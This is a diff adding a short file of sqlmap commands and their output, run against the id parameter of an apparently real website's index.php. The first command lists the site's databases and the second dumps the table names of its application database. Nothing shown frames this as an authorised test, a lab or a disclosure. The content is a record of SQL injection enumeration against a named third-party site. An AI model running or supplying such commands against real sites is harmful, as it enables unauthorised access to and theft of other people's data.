@@ -1,0 +1,17 @@
+sqlmap -o -u www.sallatykka.com/web/index.php?id=31 --dbs
+------
+available databases [2]:
+[*] information_schema
+[*] sallatykkaco
+
+sqlmap -o -u www.sallatykka.com/web/index.php?id=31 -D sallatykkaco --tables
+Database: sallatykkaco
+[4 tables]
++---------------+
+| salla2_images |
+| salla2_pages  |
+| salla_images  |
+| salla_pages   |
++---------------+
+
+
